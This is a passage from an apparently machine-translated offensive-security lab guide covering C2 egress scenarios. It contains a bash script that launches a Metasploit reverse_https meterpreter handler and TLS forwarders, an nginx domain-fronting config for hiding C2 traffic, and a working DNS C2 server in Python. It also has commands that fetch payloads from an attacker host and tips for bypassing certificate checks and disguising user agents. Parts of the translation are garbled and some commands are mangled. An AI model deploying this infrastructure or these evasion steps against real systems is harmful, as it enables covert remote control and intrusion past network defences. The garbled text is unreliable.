# Placeholder: LHOST=--lhost（Certificate CN and msf Listening Address）, LPORT=--port（TLS Listen port) and --to（Local handler Port）, 
#         DOMAIN=--domain（Certificate CN/SAN，Fill in frontend domain when field front）, TARGET=--probe（Optional TLS Handshake to target.）, 
#         PAYLOAD=--payload（msf payload First Name）
# Test status: Completed bash -n Syntaxual verification; not measured in target environment (n/a) socat/stunnel/msf，Experimental environment validation required）
set -uo pipefail

MODE="cert"
PORT="443"
TO=""
LHOST=""
DOMAIN=""
CERT="$HOME/osep/tools/cert.pem"
KEY="$HOME/osep/tools/key.pem"
PAYLOAD="windows/x64/meterpreter/reverse_https"
OUTDIR="$HOME/osep/logs"
SRVDIR="$HOME/osep/payloads"
TOOL="auto"
PROBE=""

usage() {
  cat <<'EOF'
m09-https-listener.sh —— On the flank. HTTPS Listen / TLS Forward / HTTPS Delivery (scenario) 30/31/33）

Usage: 
  bash m09-https-listener.sh --mode <cert|ssl-test|serve|msf> [Options]

Mode: 
  cert       Only create a visa（openssl）and print SHA256 Print
  ssl-test   Rise TLS Listen up. TLS Discrete Text Forward Local handler（--to）
  serve      Rise HTTPS Document delivery service (records) User-Agent，Apply Filter for Quest）
  msf        Generate msfconsole resource Script and start reverse_https handler

Options: 
  --mode MODE      Run mode (default) cert）
  --port LPORT     TLS Listen port (default) 443）
  --to LPORT       Locally specified handler Port（ssl-test It will be filled, as if 4444）
  --lhost LHOST    It's outside. IP（msf Yes. LHOST / Certificate CN Alternative）
  --domain DOMAIN  Certificate CN and SAN（Fill in frontend domain when field front DOMAIN）
  --cert FILE      Certificate path (default) ~/osep/tools/cert.pem）
  --key FILE       Private key path (default) ~/osep/tools/key.pem）
  --payload NAME   msf payload（Default windows/x64/meterpreter/reverse_https）
  --outdir DIR     Log/Resource File Directory (Default) ~/osep/logs）
  --dir DIR        serve Mode delivery directory (default) ~/osep/payloads）
  --tool NAME      Force Forward Tool: socat|stunnel|sslh|python3（Default auto）
  --probe TARGET   Do it again. TARGET:443 Yes. TLS Handshake Info Output
  -h, --help       Show this help

Example:: 
  bash m09-https-listener.sh --mode cert --domain DOMAIN
  bash m09-https-listener.sh --mode ssl-test --port 443 --to 4444
  bash m09-https-listener.sh --mode serve --port 8443 --dir ~/osep/payloads
  bash m09-https-listener.sh --mode msf --port 443 --lhost LHOST
EOF
}

info() { printf '[*] %s\n' "$*"; }
ok()   { printf '[+] %s\n' "$*"; }
err()  { printf '[-] %s\n' "$*" >&2; }
die()  { err "$*"; exit 2; }

have() { command -v "$1" >/dev/null 2>&1; }

while [[ $# -gt 0 ]]; do
  case "$1" in
    --mode)    MODE="${2:-}"; shift 2 ;;
    --port)    PORT="${2:-}"; shift 2 ;;
    --to)      TO="${2:-}"; shift 2 ;;
    --lhost)   LHOST="${2:-}"; shift 2 ;;
    --domain)  DOMAIN="${2:-}"; shift 2 ;;
    --cert)    CERT="${2:-}"; shift 2 ;;
    --key)     KEY="${2:-}"; shift 2 ;;
    --payload) PAYLOAD="${2:-}"; shift 2 ;;
    --outdir)  OUTDIR="${2:-}"; shift 2 ;;
    --dir)     SRVDIR="${2:-}"; shift 2 ;;
    --tool)    TOOL="${2:-}"; shift 2 ;;
    --probe)   PROBE="${2:-}"; shift 2 ;;
    -h|--help) usage; exit 0 ;;
    *)         err "Unknown parameter: $1"; usage; exit 2 ;;
  esac
done

[[ "$MODE" == "cert" || "$MODE" == "ssl-test" || "$MODE" == "serve" || "$MODE" == "msf" ]] \
  || die "--mode Must be. cert|ssl-test|serve|msf（Current: ${MODE}）"
[[ "$PORT" =~ ^[0-9]+$ ]] || die "--port Must be numbers (current): ${PORT}）"
mkdir -p "$OUTDIR" || die "Cannot create log directory $OUTDIR"

# ---------------- Certificate ----------------
gen_cert() {
  have openssl || die "Missing openssl（Kali Bring your own；macOS Available Homebrew Install）"
  local cn="${DOMAIN:-${LHOST:-LHOST}}"
  mkdir -p "$(dirname "$CERT")" || die "Cannot create certificate directory $(dirname "$CERT")"
  info "Generate visa CN=$cn -> $CERT"
  if ! openssl req -newkey rsa:2048 -nodes -keyout "$KEY" -x509 -days 365 -out "$CERT" \
        -subj "/CN=$cn" -addext "subjectAltName=DNS:$cn" 2>/dev/null; then
    # Old version openssl Not supported -addext: Don't take it back. SAN The way it's written.
    openssl req -newkey rsa:2048 -nodes -keyout "$KEY" -x509 -days 365 -out "$CERT" \
      -subj "/CN=$cn" || die "openssl Failed to generate certificate"
  fi
  ok "Certificate: $CERT"
  ok "Private Key: $KEY"
  echo "--- Fingerprints (taking test notes; using target side trust or miscalculation)）---"
  openssl x509 -in "$CERT" -noout -fingerprint -sha256
  openssl x509 -in "$CERT" -noout -subject -dates
}

ensure_cert() {
  if [[ -f "$CERT" && -f "$KEY" ]]; then
    ok "Use an existing certificate: $CERT"
    return 0
  fi
  info "The certificate doesn't exist, sir."
  gen_cert
}

# ---------------- TLS Termination of forwarding（socat / stunnel / python3） ----------------
run_socat() {
  have socat || return 1
  info "Tools: socat  OPENSSL-LISTEN:$PORT -> 127.0.0.1:${TO}"
  exec socat -v -lf "$OUTDIR/tls-$PORT.log" \
    "OPENSSL-LISTEN:$PORT,cert=$CERT,key=$KEY,verify=0,fork,reuseaddr" \
    "TCP:127.0.0.1:${TO}"
}

run_stunnel() {
  have stunnel || have stunnel4 || return 1
  local bin="stunnel"; have stunnel || bin="stunnel4"
  info "Tools: $bin  Listen $PORT -> 127.0.0.1:${TO}"
  exec "$bin" -fd 0 <<EOF
foreground = yes
pid =
output = $OUTDIR/tls-$PORT.log
[c2]
cert = $CERT
key = $KEY
accept = 0.0.0.0:$PORT
connect = 127.0.0.1:$TO
EOF
}

run_python() {
  have python3 || return 1
  info "Tools: python3（Internal ssl Forward, zero installation）  TLS:$PORT -> 127.0.0.1:${TO}"
  info "Shake hands and abnormal logs: $OUTDIR/tls-$PORT.log"
  CERT="$CERT" KEY="$KEY" LPORT="$PORT" TOPORT="${TO}" LOGFILE="$OUTDIR/tls-$PORT.log" \
  python3 - <<'PY' 2>&1 | tee -a "$OUTDIR/tls-$PORT.log"
import datetime, os, socket, ssl, sys, threading

cert    = os.environ["CERT"]
key     = os.environ["KEY"]
lport   = int(os.environ["LPORT"])
toport  = int(os.environ["TOPORT"])

ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ctx.load_cert_chain(cert, key)

srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("0.0.0.0", lport))
srv.listen(32)
print("[*] %s TLS listen 0.0.0.0:%d -> 127.0.0.1:%d" %
      (datetime.datetime.now(), lport, toport), flush=True)

def pipe(a, b):
    try:
        while True:
            data = a.recv(4096)
            if not data:
                break
            b.sendall(data)
    except OSError:
        pass
    finally:
        for s in (a, b):
            try:
                s.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass
            try:
                s.close()
            except OSError:
                pass

def handle(conn, addr):
    try:
        tls = ctx.wrap_socket(conn, server_side=True)
    except (ssl.SSLError, OSError) as e:
        print("[-] %s TLS The handshake failed.: %s" % (addr[0], e), flush=True)
        conn.close()
        return
    print("[+] %s Handshake complete. %s %s" % (addr[0], tls.version(), tls.cipher()[0]), flush=True)
    try:
        up = socket.create_connection(("127.0.0.1", toport), 5)
    except OSError as e:
        print("[-] Local handler 127.0.0.1:%d It's impossible.: %s（First. handler Run another script.）" %
              (toport, e), flush=True)
        tls.close()
        return
    threading.Thread(target=pipe, args=(tls, up), daemon=True).start()
    pipe(up, tls)

while True:
    conn, addr = srv.accept()
    threading.Thread(target=handle, args=(conn, addr), daemon=True).start()
PY
}

run_sslh() {
  have sslh || die "Not found sslh（Kali: apt install sslh）；Passage mode is not clear. TLS，Just give the traffic to the locals. handler"
  info "Tools: sslh（Passage，TLS From Backend handler Help yourself.）  $PORT -> 127.0.0.1:${TO}"
  [[ -n "${TO}" ]] || die "sslh Mode needs --to Specify Backend"
  exec sslh --listen "0.0.0.0:$PORT" --tls "127.0.0.1:${TO}" --foreground
}

do_ssl_test() {
  [[ -n "${TO}" ]] || die "ssl-test Yes. --to <Local handler Port>，Example: --port 443 --to 4444"
  ensure_cert
  info "Process Reminder: First locally specified handler（Like msf reverse_http or ncat -lvnp ${TO}），It's done by a script. TLS Termination"
  case "$TOOL" in
    socat)   run_socat ;;
    stunnel) run_stunnel || die "stunnel Starting Failed" ;;
    sslh)    run_sslh ;;
    python3) run_python ;;
    auto)
      run_socat || run_stunnel || run_python
      ;;
    *) die "--tool It can only be. socat|stunnel|sslh|python3" ;;
  esac
}

# ---------------- HTTPS Organisation ----------------
do_serve() {
  have python3 || die "serve Mode needs python3"
  ensure_cert
  [[ -d "$SRVDIR" ]] || info "Organisation $SRVDIR It doesn't exist. PAYLOAD Put it in (or change) --dir）"
  mkdir -p "$SRVDIR"
  info "HTTPS Organisation :$PORT  Contents=$SRVDIR  Log=$OUTDIR/https-$PORT.log"
  SRVDIR="$SRVDIR" CERT="$CERT" KEY="$KEY" LPORT="$PORT" \
  python3 - <<'PY' 2>&1 | tee -a "$OUTDIR/https-$PORT.log"
import datetime, http.server, os, socketserver, ssl

srvdir = os.environ["SRVDIR"]
lport  = int(os.environ["LPORT"])
os.chdir(srvdir)

class H(http.server.SimpleHTTPRequestHandler):
    def log_message(self, fmt, *args):
        ua = self.headers.get("User-Agent", "-")
        host = self.headers.get("Host", "-")
        print("%s %s host=%s ua=%s %s" %
              (datetime.datetime.now(), self.address_string(), host, ua, fmt % args))

class S(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True

httpd = S(("0.0.0.0", lport), H)
ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ctx.load_cert_chain(os.environ["CERT"], os.environ["KEY"])
httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)
print("[*] https://0.0.0.0:%d serving %s" % (lport, srvdir), flush=True)
httpd.serve_forever()
PY
}

# ---------------- msf handler ----------------
do_msf() {
  have msfconsole || die "Not found msfconsole（Kali Bring your own）"
  [[ -n "$LHOST" ]] || die "msf Mode needs --lhost LHOST"
  local rc="$OUTDIR/https-handler-$PORT.rc"
  cat > "$rc" <<EOF
use exploit/multi/handler
set PAYLOAD $PAYLOAD
set LHOST $LHOST
set LPORT $PORT
set ExitOnSession false
set EnableStageEncoding true
run -j
EOF
  ok "resource Script: $rc"
  info "Hint: If in front socat/stunnel Do it. TLS terminate, then msf Should be used instead reverse_http（"Exactly" listening. 127.0.0.1:${TO}，"
  info "      Script msf Mode for payload Take it yourself. TLS（reverse_https）Direct connection. 443 Situation。"
  exec msfconsole -q -r "$rc"
}

# ---------------- Optional: against target TLS Handshake detection. ----------------
do_probe() {
  have openssl || return 0
  info "Detection $PROBE:443 Yes. TLS（For comparison'Target access public network HTTPS Normal / Access to us failed'）"
  echo | timeout 8 openssl s_client -connect "$PROBE:443" -servername "$PROBE" 2>&1 \
    | grep -E "CONNECTED|subject=|issuer=|Protocol|Cipher|Verify return code|alert" | head -20
}

case "$MODE" in
  cert)     gen_cert ;;
  ssl-test) do_ssl_test ;;
  serve)    do_serve ;;
  msf)      do_msf ;;
esac

[[ -n "$PROBE" ]] && do_probe
exit 0
````

**Verify**: "The Path Passes" is marked at every stage of the path card (Designation log GET / Handshake log / session); ExitOnSecession false can still return.

**If it fails / alternatives**:
- The target requested phase II but the process was terminated static/behaviour testing, processed by M05 scene 18-19, and no further change of address.
- The request did not go to the 28/29 check agent and identity context.
-Staged failed repeatedly to replace single path of stages; still failed to check the number of payload digits (x86/x64).

**Specific Attention OPSEC**: The first stage of the examination, which was to be considered successful, must be followed by the second stage of the session; each stage records the path card and avoids memory guessing of the URL/port.

---

## Scenario 31: Egress allows only HTTPS, but HTTPS inspection breaks the channel

**Situation**: the target can access the regular HTTPS website, and our side payload failed at the TLS handshake or request stage - there is proxy check, certificate trust or application layer (UA/path) filter.

**Presumptives and assumptions**: exports will only be released 443/HTTPS; there may be an intermediate TLS (MiTM re-sign) or only a check to a white list domain name; our listening side will be able to provide HTTPS services and view handshakes/request logs.

**Prepare (attacker)**: Generate certificates and start HTTPS delivery/tapping, both of which are ready:
- Self-signed: `opensl req-newkey rsa: 2048-nodes-keyout key.pem-x509-days 365-out cert.pem-subj "/CN=LHOST' (where the target does not check the root;**fingerprinting is easy to miscalculate).
- Credible certificates: Public domain name + Let's Encrypt (the most stable when exporting without MITM); an in-school CA can also import trust in an experimental network.

**Procedure**:
Subpoint positioning: Whether the target can even access your 443 (`Test-NetConnaction LHOST-Port 443') to even the failed TLS certificate/intermediate box problem; not even the export filtered by IP/SNI.
2. Failed handshake certificates: See if HTTPS listening log records handshakes occurred, and the client reported errors (certificates do not match letters/ hostnames). The visa document implicitly refuses to add `-SkipCertificateCheck ' (PS 7) or `ServerCertificateValidationCallback ' (PS 5, Script) to the client ' , or to add the visa to the target.
3. Intermediate box MITM re-sign: The target trust is the root of the middle box, the root of the middle box, the self-signing must fail, the "domain name + credible certificate from the middle box" is replaced (see failure branch and field prefix 33).
4. Application layer filter row UA/path: request for head disguise common browser UA (m09-https-lister.sh records UA for verification); path/search string without signature.
5. If the target requests proxy access to the HTTPS combination scenario 28: Proxy + HTTPS client.

**Lab files**:
| File | Purpose | Key args |
|---|---|---|
`m09-https-lister.sh ' |HTTPS listening: msf reverse https handler or TLS test mode, record UA/ handshake | --mode msf\ssl-test --certcert.pem-keykey.pem '
`m09-domain-fronting-nginx.conf` requires forward-end templates for domain/SNI processing
|m09-proxy-aware-downloader.ps1`HTTPS download |Certificate Validation Switch |-Url https://LHOST/PAYLOAD -SkipCertCheck '|

#### `m09-domain-fronting-nginx.conf` {#m09-domain-fronting-nginx-conf}

````nginx
# Use: Domain Forward（Domain Fronting）Frontend Configuration——TLS Frontend domain name for layered target release DOMAIN（SNI + Certificate），
#       HTTP Layer Host Headwritten Real Backend ID URL，nginx Press Host Forward Request to Backend C2（LHOST:LPORT）。
#       The exit inspection saw... SNI/Certificate/purpose address = DOMAIN（Let go) Backend only nginx Internal press Host Decision。
# scenarios: 33（Targets are released only for specific front-end addresses, with no direct backend; experimental infrastructure supports front-end/back-end separation）, 31（HTTPS Check the sidewalk.）
# Dependency: nginx（stream Sector Press SNI The diversion needs --with-stream_ssl_preread module, only if no module http Sector Press Host Just divert.）；
#       DOMAIN Yes. TLS Certificate (auto-sign is available, provided the target side does not verify or we have ignored the certificate verification); backend C2/I'm listening.（m09-https-listener.sh）
# Use: 
#   1) Replace all placeholders and then put them to /etc/nginx/nginx.conf（Or put http{} Contents include Enter Current Configuration）
#   2) nginx -t && nginx -s reload
#   3) Target side verification: curl -k --resolve DOMAIN:443:LHOST -H "Host: URL" https://DOMAIN/PAYLOAD -o PAYLOAD
# Placeholder: DOMAIN=Frontend domain name (target allows access)；SNI Use it with the certificate.）, URL=Backend ID（Host Put it in your head.，nginx By which route）, 
#         LHOST=Backend C2 Listening Address, LPORT=Backend C2 Port, PAYLOAD=Filename delivered
# Test status: Not present nginx measured;configuring structure by nginx Syntax manual check（map / upstream / if+proxy_pass Usage）

worker_processes auto;

events {
    worker_connections 1024;
}

http {
    default_type application/octet-stream;
    sendfile on;
    keepalive_timeout 15;

    # ---- Backend identification determination: Host Head equals URL , other DOMAIN Back to Cover Page ----
    # nginx Lee. "1" Really? / "0" It's fake, so here it is. 0/1 Not yes/no
    map $http_host $is_backend {
        default        0;
        "URL"          1;
    }

    upstream c2_backend {
        server LHOST:LPORT;
        keepalive 8;
    }

    # ---- Query logs: both logs SNI, Host, UA（scene 31 Positioning"The handshake worked, but the request was stopped."）----
    log_format fronting '$remote_addr [$time_local] sni=$ssl_server_name '
                        'host=$http_host ua="$http_user_agent" '
                        'proto=$ssl_protocol req="$request" status=$status backend=$is_backend';
    access_log /var/log/nginx/fronting-access.log fronting;
    error_log  /var/log/nginx/fronting-error.log warn;

    # ---- Frontend: 443 End TLS，Certificate to DOMAIN ----
    server {
        listen 443 ssl default_server;
        server_name DOMAIN;

        ssl_certificate     /etc/nginx/certs/DOMAIN.crt;
        ssl_certificate_key /etc/nginx/certs/DOMAIN.key;
        ssl_protocols       TLSv1.2 TLSv1.3;
        ssl_prefer_server_ciphers off;
        ssl_session_cache   shared:fronting:1m;

        # SNI Note (focus)）: 
        #   - Client must let SNI = DOMAIN（curl Use --resolve DOMAIN:443:LHOST Assign，PowerShell Direct https://DOMAIN/）
        #   - If the client SNI It's also written. URL，The undisclosed domain name will be found at the exit and the pre-domain is disabled.
        #   - nginx Yes. $ssl_server_name For log records only, this configuration is not done SNI Verify (or refuse) Host=URL Request）

        # Large request（staged payload / Don't be cut off.
        client_max_body_size 64m;
        proxy_request_buffering off;
        proxy_buffering off;

        # Cover and back-end responses returned in plain text to avoid being used as an anomaly
        default_type text/plain;

        # Visible Path Entry: Even Host Discrepancies are judged and backend transmission is also made using a fixed path (to facilitate rapid pre-test validation)）
        location = /PAYLOAD {
            proxy_pass http://c2_backend;
            proxy_http_version 1.1;
            proxy_set_header Host              $http_host;
            proxy_set_header X-Forwarded-For   $remote_addr;
            proxy_set_header X-Forwarded-Proto https;
            proxy_set_header Connection        "";
        }

        location / {
            # Host=URL → Forward to Backend C2；Keep original Host，Backend to press Host Identify yourself. vhost
            if ($is_backend) {
                proxy_pass http://c2_backend;
                proxy_http_version 1.1;
                proxy_set_header Host              $http_host;
                proxy_set_header X-Forwarded-For   $remote_addr;
                proxy_set_header Connection        "";
                break;
            }

            # Other Host（Including regular visits DOMAIN）→ Return harmless pages as cover
            return 200 "ok\n";
        }
    }

    # ---- Express 80: For local use only/nginx Self-connectivity test, no forwarding. ----
    server {
        listen 80 default_server;
        server_name DOMAIN;
        location / { return 200 "ok\n"; }
    }
}

# ============================================================
# Optional: stream Sector Press SNI Diversion (need) nginx Compile Tape --with-stream_ssl_preread）
# Purpose: Same port，SNI=DOMAIN The flow backend C2，Other SNI Turn local disguise stations。
# With the top http Select one paragraph to be used; when enabled 443 Port gave. stream（http Replace paragraph with listen 8443 Or something.）。
# ============================================================
# stream {
#     log_format sni '$remote_addr sni=$ssl_preread_server_name -> $upstream_addr';
#     access_log /var/log/nginx/fronting-sni.log sni;
#
#     map $ssl_preread_server_name $sni_upstream {
#         default        127.0.0.1:8080;    # Not matched: local disguise site
#         "DOMAIN"       LHOST:LPORT;       # SNI=DOMAIN: Backend C2（TLS By the back end.）
#     }
#
#     server {
#         listen 443;
#         ssl_preread on;                   # Read-only SNI，I don't know. TLS
#         proxy_pass $sni_upstream;
#     }
# }

# ============================================================
# Validation procedure (one test prior to examination) GET）
#   1) Target side confirmed only release. DOMAIN: 
#        curl -sI https://DOMAIN/            → Expectations 200 "ok"
#   2) With Backend Host Load（SNI Still. DOMAIN）: 
#        curl -k --resolve DOMAIN:443:LHOST -H "Host: URL" https://DOMAIN/PAYLOAD -o PAYLOAD
#   3) Backend Log（m09-https-listener.sh --mode serve and Host=URL
#   4) PowerShell Form (scenes) 33 Writing in Document）: 
#        $c = New-Object Net.WebClient; $c.Headers.Add("Host","URL");
#        $c.DownloadString("https://DOMAIN/PAYLOAD")
#
# Query order when not established
#   - Back 421/403/502: Frontend (or Real) CDN）Checked. SNI and Host Coherence → The infrastructure does not support the local front. Change the scene. 28（or 32（DNS）
#   - Could not close temporary folder: %s（curl -k / PowerShell Yes. ServerCertificateValidationCallback），
#     Otherwise, hold it. DOMAIN Can not open message
#   - Backend No Log: Check upstream Yes. LHOST:LPORT Are you listening?（ss -ltnp），and $is_backend Was it... map Hit.
# ============================================================
````

**Verify**: Handshake log shows target completed TLS (or msf session); contrasting "Target access to public network HTTPS normal vs access to us failed" eliminated.

**If it fails / alternatives**:
- Re-sign the intermediate box and verify the chain;
- Exports are based on SNI/purpose IP white list domain prefix (33); even white list outer domain names are not analysed DNS channel (32).
- The client does not verify but the handshake failed

**OPSEC**: Fingerprints of the visa book are visible, miscalculated to confirm that your own fingerprints are in the listening log; UA is consistent with the delivery/download phase, with half of the default disguise; HTTPS not encrypted agent Host/SNI, do not place confidential in URL.

---

## Scenario 32: Plain HTTP(S) fails, but the lab allows a DNS channel

**Situation**: the target can execute the code and no direct connection to the regular agent is available, but the target is still available online through DNS.

**Preconditions and assumptions**: the experimental/test environment explicitly allows the DNS tunnel (textbook §14.7); you have a domain (or a domain name allowed within the experimental network) and can point the NS records to the attacker, or the target can reach the attacker directly UDP 53; the target machine is capable of executing our client (Python 3 needs an interpreter; dnscat2/iodine or PowerShell port, as described in the script note).

**Prepare (attacker)**: this module carries its smallest DNS C2 pair (`m09-dns-c2-server.py`+ `m09-dns-c2-client.py`) for "Recognizing that the DNS channel can be retrieved by means of + transmission command". The complete tunnel tool dnscat2/iodine goes up when needed. UDP 53:

```bash
# Attacker: authoritative DNS C2 server (over 53 needs root)
sudo python3 m09-dns-c2-server.py --listen 0.0.0.0 --port 53 \
    --domain c2.example --outdir ~/osep/logs
# Server console input: SESSIONID whoami /priv # command the specified session
```

**Procedure**:
1. The target side confirms that DNS can reach: `nslookup c2.example LHOST ' (direct company) or normal `nslookup ' repatriation (depending on the environment).
2. Target side-to-side client (without Python, send the interpreter first or change dnscat2 binary):
```bash
python3 m09-dns-c2-client.py --server LHOST --port 53 --domain c2.example \
    --session a1b2c3d4 --interval 2
```
3. The client heart beats with a session id → server console commands the session → the client to decode and locally execute → the output segment returns via the `o&lt;hex&gt; ` tab (a single command output is controlled in 1-2 KB, greater fractions).
4. Server-end confirmation of receipt of output (end printing / outdir landing). The DNS query is a regular A query at the exit without proxy on the path.
5. When the corridor is stabilized, the second phase is also replaced by DNS delivery (no landing, few requests), or only DNS is used for emergency return.

**Lab files**:
| File | Purpose | Key args |
|---|---|---|
`m09-dns-c2-server.py ' |DNS C2 Service (UDP 53, A Record Response) |-listen 0.0.0.0-port 53-domain c2.example ' |
|-server LHOST-session a1b2c3d4-interval2`

#### `m09-dns-c2-server.py` {#m09-dns-c2-server-py}

````python
#!/usr/bin/env python3
"""Purpose: Extreme simplicity DNS C2 Service - Encoding Commands In. DNS A Record the response back to the target while receiving the target by sub-area hex Return output。
        Cooperation m09-dns-c2-client.py Use for confirmation DNS Channels can be used and a small number of commands/outputs are interactive (learning materials) §14.7 Minimum realization of ideas）。

scene: 32（HTTP(S) It's not working, but it's allowed. DNS An emergency return during the tunnel. Full flow tunnel, please. dnscat2/iodine，Ben was just doing it."It's not working. + Send command to retrieve output"。

Dependency: Python 3.7+ Standard library（socket/struct）。Yes. root Listen 53，Or the target can be connected. UDP Port。
      Domain name requirement: Laboratory permitted domain NS Point to the machine, or to the client's direct connection. IP（Ben achieves default straight-link mode, simplest）。

Use: 
    sudo python3 m09-dns-c2-server.py --port 53 --domain c2.example --outdir ~/osep/logs
    Service-end console (interactive mode)）: 
        list                        # Lists sessions where heart beats have been seen
        send <SESSION> whoami /priv # Issue an order for the session (long) <= 40 Bytes）
        quit
    Authentication (other terminal)）: 
        dig @LHOST c2.example        # If not dig，tcpdump -i any udp port 53

Placeholder: LHOST=Attack aircraft IP；SESSION=Client selected 8 bit hex Session id；c2.example=You control the area suffix.

Test status: Already Kali/macOS Use Python3 Syntax compiled and on-line with client 127.0.0.1:5353 I've been through a straight circuit test.
          （Server beats, orders issued, backsends transmitted）。DNS Recursive/NS Deployment pattern not validated in real territory, pre-test scenario 32 Step one, do no harm.。
"""
import argparse
import binascii
import os
import socket
import struct
import sys
import threading

MAX_CMD = 40          # Maximum number of command bytes returned from each query（4 Bytes/A Records * 10 Article A Records）
CMD_END = b"\n"       # Command end tag
pools = {}            # session -> {"in": bytes To be sent, "out": bytes Pending Log}
sessions = {}         # session -> last-seen ts（Simple Count）
_lock = threading.Lock()

def parse_qname(data, off):
    """Parsing DNS Name (with compression pointer), return (name_str, End Offset)。"""
    labels, end = [], None
    while True:
        ln = data[off]
        if ln == 0:
            end = off + 1
            break
        if ln & 0xC0 == 0xC0:                    # Compressor Pointer: 0xC0 0xXX，Point to internal deviation of the package
            ptr = struct.unpack(">H", data[off:off + 2])[0] & 0x3FFF
            if end is None:
                end = off + 2
            off = ptr
            continue
        labels.append(data[off + 1:off + 1 + ln].decode("ascii", "ignore"))
        off += 1 + ln
    return ".".join(labels), end

def parse_query(data):
    """Parsing query headers + First question, return. (tid, qname, Problem end offset)。"""
    if len(data) < 12:
        return None
    tid = struct.unpack(">H", data[:2])[0]
    qd = struct.unpack(">H", data[4:6])[0]
    if qd < 1:
        return None
    qname, off = parse_qname(data, 12)
    return tid, qname.lower(), off + 4          # Skip qtype+qclass

def encode_name(name):
    """Put 'a.b.c' Domain Name String Encoding As DNS Line format (each paragraph) <=63 Character）。"""
    out = b""
    for label in name.split("."):
        b = label.encode("ascii")
        if len(b) > 63:
            raise ValueError("label too long: " + label)
        out += bytes([len(b)]) + b
    return out + b"\x00"

def build_reply(tid, qname, rdatas=None):
    """Construct Standard Response: echo Problem + N Article A Records（rdatas Yes 4 Bytes rdata List）。"""
    rdatas = rdatas or []
    flags = 0x8180                              # QR=1 RD=1 RA=1
    hdr = struct.pack(">HHHHH", tid, flags, 1, len(rdatas), 0, 0)
    q = encode_name(qname) + struct.pack(">HH", 1, 1)      # qtype=A qclass=IN
    ans = b""
    for r in rdatas:
        ans += b"\xc0\x0c" + struct.pack(">HHIH", 1, 1, 1, 4) + r   # Name pointer.+A+IN+ttl1+rdlen4+rdata
    return hdr + q + ans

def chunk_cmd(cmd, max_cmd=MAX_CMD):
    """Cut the bytes of the command. <=max_cmd Yes. 4 multiple length blocks, return [(Blocks, Is it the last piece?)]。"""
    chunks = []
    for i in range(0, len(cmd), max_cmd):
        piece = cmd[i:i + max_cmd]
        last = i + max_cmd >= len(cmd)
        chunks.append((piece, last))
    return chunks

def pack_rdatas(chunk):
    """Cut the bytes. 4 Byte group (end group zero) as A Records rdata。"""
    out = []
    for i in range(0, len(chunk), 4):
        out.append(chunk[i:i + 4].ljust(4, b"\x00"))
    return out

def handle(data, domain, outdir):
    parsed = parse_query(data)
    if not parsed:
        return b""
    tid, qname, _ = parsed
    if not qname.endswith("." + domain) and qname != domain:
        return b""                              # Discard non-local query
    head = qname[: -(len(domain) + 1)] if qname != domain else ""
    parts = head.split(".")
    if len(parts) < 2:
        return b""
    kind, session = parts[0], parts[1]
    if not all(c in "0123456789abcdef" for c in session) or len(session) > 16:
        return b""

    with _lock:
        pools.setdefault(session, {"in": b"", "out": b""})
        if kind == "h":                         # Heart beat: routing command (coding answers) A In the record.）
            sessions[session] = sessions.get(session, 0) + 1
            buf = pools[session]["in"]
            take = buf[:MAX_CMD]
            if take:
                pools[session]["in"] = buf[len(take):]
                print(f"[>] session={session} Release {len(take)} Bytes", flush=True)
                return build_reply(tid, qname, pack_rdatas(take))
            return build_reply(tid, qname)      # No orders to be issued: empty responses
        if kind == "o":                         # Back Transfer Out: o.<session>.<hexdata>.<domain>
            hexdata = "".join(parts[2:])
            try:
                raw = binascii.unhexlify(hexdata)
            except Exception:
                return b""
            pools[session]["out"] += raw
            fname = os.path.join(outdir, f"{session}.out")
            with open(fname, "ab") as f:
                f.write(raw + b"\n")
            print(f"[<] session={session} Copy that. {len(raw)} Bytes -> {fname}", flush=True)
            return build_reply(tid, qname)
    return b""

def console(domain):
    print("[*] Console: list | send <SESSION> <cmd(<=40B)> | quit", flush=True)
    for line in sys.stdin:
        line = line.strip()
        if line == "quit":
            os._exit(0)
        if line == "list":
            print(f"[*] Active Session: {sorted(sessions)}", flush=True)
        elif line.startswith("send "):
            rest = line[5:].split(" ", 1)
            if len(rest) != 2:
                print("[-] Usage: send <SESSION> <command>", flush=True)
                continue
            sid, cmd = rest[0], rest[1].encode()
            if len(cmd) > 512:
                print("[-] It's a long command.(>512B)，Break Short Redeals (output please let client split back) Pass）", flush=True)
                continue
            with _lock:
                pools.setdefault(sid, {"in": b"", "out": b""})
                pools[sid]["in"] += cmd + CMD_END
            print(f"[>] I'm in line. {sid}: {cmd.decode(errors='replace')} (min {-(len(cmd) // -MAX_CMD)} The heart's beating.)", flush=True)

def main():
    ap = argparse.ArgumentParser(description="Very simple DNS C2 Service end (scenes) 32）")
    ap.add_argument("--listen", default="0.0.0.0")
    ap.add_argument("--port", type=int, default=53)
    ap.add_argument("--domain", required=True, help="We control the area suffix like c2.example")
    ap.add_argument("--outdir", default=".")
    args = ap.parse_args()
    os.makedirs(args.outdir, exist_ok=True)

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind((args.listen, args.port))
    print(f"[*] DNS C2 Listen {args.listen}:{args.port}  domain={args.domain}  outdir={args.outdir}", flush=True)

    threading.Thread(target=console, args=(args.domain,), daemon=True).start()
    while True:
        data, addr = s.recvfrom(4096)
        reply = handle(data, args.domain, args.outdir)
        if reply:
            s.sendto(reply, addr)

if __name__ == "__main__":
    main()
````

#### `m09-dns-c2-client.py` {#m09-dns-c2-client-py}

````python
#!/usr/bin/env python3
"""Purpose: Extreme simplicity DNS C2 Client - with m09-dns-c2-server.py Match, use DNS Query for heart beat command, return command output。
        Use All Python Standard library（socket Build yourself DNS Information, no reliance. dnspython / requests），
        To run directly on targets without a third-party vault.。

scene: 32（HTTP(S) None with agent, but the experimental/test environment allows DNS Emergency command tunnel at the tunnel.）。

Dependency: Python 3（Standard library: socket/struct/binascii/subprocess）；Target needs access. --server Start UDP 53 Question。
      None Python Objective of the interpreter: Use dnscat2 Client, or by end of file"Elements of a transplant"Replace with PowerShell（Resolve-DnsName）。

Use: 
    python3 m09-dns-c2-client.py --server LHOST --port 53 --domain c2.example \
        --session a1b2c3d4 --interval 2
    # Service-end console: list / send a1b2c3d4 whoami /priv / quit

